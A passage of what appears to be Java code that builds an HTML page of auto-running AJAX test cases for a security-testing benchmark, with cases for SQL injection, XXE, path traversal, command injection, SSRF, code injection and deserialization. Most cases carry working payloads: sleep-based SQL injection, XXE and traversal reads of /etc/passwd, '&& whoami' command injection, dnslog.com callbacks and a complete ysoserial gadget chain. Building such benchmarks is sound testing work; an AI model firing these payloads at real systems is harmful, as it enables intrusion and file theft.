                "        addCookie(\"BS00113\", \"BS00113\", \"1d\", \"/jsonp/BS00113\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/jsonp/BS00113',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00113\": \"BS00113\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00098\", \"BS00098\", \"1d\", \"/sqli/BS00098?BS00098=%31%27%20%6f%72%20%28%73%65%6c%65%63%74%20%73%6c%65%65%70%28%31%30%29%29%20%20%6f%72%20%27\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00098?BS00098=%31%27%20%6f%72%20%28%73%65%6c%65%63%74%20%73%6c%65%65%70%28%31%30%29%29%20%20%6f%72%20%27',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00098\": \"BS00098\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00073\", \"BS00073\", \"1d\", \"/xxe/BS00073\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                data = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM \"file:////etc//passwd\" >]>' + '\\n' +'<root><name>&xxe;</name></root>';\n" +
                "                $.ajax({\n" +
                "                    url: '/xxe/BS00073',\n" +
                "                    type: 'POST',\n" +
                "                    contentType : 'application/xml;charset=UTF-8',\n" +
                "                    data: data,\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00073\": \"BS00073\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00067\", \"BS00067\", \"1d\", \"/sqli/BS00067\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00067',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"BS00067\":\"bar\\' and \\'1\\'=\\'1\"}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00067\": \"BS00067\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00042\", \"BS00042\", \"1d\", \"/cmdi/BS00042?BS00042=FOO=whoami\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00042?BS00042=FOO=whoami',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00042\": \"BS00042\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00056\", \"BS00056\", \"1d\", \"/code_injection/BS00056\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/code_injection/BS00056',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00056=1%2b1',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00056\": \"BS00056\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00081\", \"BS00081\", \"1d\", \"/pathtraver/BS00081\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                data = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><root> <username>foo</username> <password>bar</password>' + '\\n' +' <BS00081>' + '\\n' +'../../../../../../../../etc/passwd' + '\\n' +'</BS00081>' + '\\n' +' </root>';\n" +
                "                $.ajax({\n" +
                "                    url: '/pathtraver/BS00081',\n" +
                "                    type: 'POST',\n" +
                "                    contentType : 'application/xml;charset=UTF-8',\n" +
                "                    data: data,\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00081\": \"BS00081\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00095\", \"BS00095\", \"1d\", \"/pathtraver/BS00095\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/pathtraver/BS00095',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"command\":{\"filename\":\"../../../../etc/passwd\",\"action\":\"download\"}}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00095\": \"BS00095\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00136\", \"BS00136\", \"1d\", \"/ssrf/BS00136\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00136',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00136={\"BS00136\":\"http://dnslog.com\"}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00136\": \"BS00136\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00122\", \"BS00122\", \"1d\", \"/sqli/BS00122?BS00122=%31%29%20%41%4e%44%20%53%4c%45%45%50%28%35%29%20%2d%2d%20%2d\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00122?BS00122=%31%29%20%41%4e%44%20%53%4c%45%45%50%28%35%29%20%2d%2d%20%2d',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00122\": \"BS00122\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00113\", \"BS00113\", \"1d\", \"/cmdi/BS00123\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00123',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00123=123 %26%26 whoami',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00113\": \"BS00113\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00137\", \"BS00137\", \"1d\", \"/ssrf/BS00137\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00137',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00137={\"rs\": {\"BS00137\":\"http://dnslog.com\"}}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00137\": \"BS00137\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00094\", \"BS00094\", \"1d\", \"/sqli/BS00094?BS00094=foo'%20%26%26%201=1%23\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: \"/sqli/BS00094?BS00094=foo'%20%26%26%201=1%23\",\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00094\": \"BS00094\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00080\", \"BS00080\", \"1d\", \"/pathtraver/BS00080\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/pathtraver/BS00080',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"BS00080\":\"../../../../../../etc/passwd\"}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00101\": \"BS00101\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00057\", \"BS00057\", \"1d\", \"/deserialization/BS00057\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/deserialization/BS00057',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog.com\"}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00057\": \"BS00057\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00043\", \"BS00043\", \"1d\", \"/sqli/BS00043\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00043',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00043=test',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00043\": \"BS00043\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" );
        sb.append(
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00069\", \"BS00069\", \"1d\", \"/sensitive/BS00069\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00069',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00069\": \"BS00069\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00055\", \"BS00055\", \"1d\", \"/code_injection/BS00055\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/code_injection/BS00055',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00055=1%2b1',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00055\": \"BS00055\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00041\", \"BS00041\", \"1d\", \"/cmdi/BS00041?BS00041=a%26%26whoami\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00041?BS00041=a%26%26whoami',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00041\": \"BS00041\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00095\", \"BS00095\", \"1d\", \"/deserialization/BS00096\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/deserialization/BS00096',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABpzK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAH3lzb3NlcmlhbC9Qd25lcjEzMTYxNDcxMDIyMTExMDABACFMeXNvc2VyaWFsL1B3bmVyMTMxNjE0NzEwMjIxMTEwMDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+AB8AAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHB3BAAAAANzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXEAfgApeA==',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00095\": \"BS00095\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00082\", \"BS00082\", \"1d\", \"/pathtraver/BS00082\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/pathtraver/BS00082',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00082=test1/../test1/test',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00082\": \"BS00082\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00108\", \"BS00108\", \"1d\", \"/ssrf/BS00109?BS00109=jdbc:mysql://dnslog.com&username=1&password=1\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00109?BS00109=jdbc:mysql://dnslog.com&username=1&password=1',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
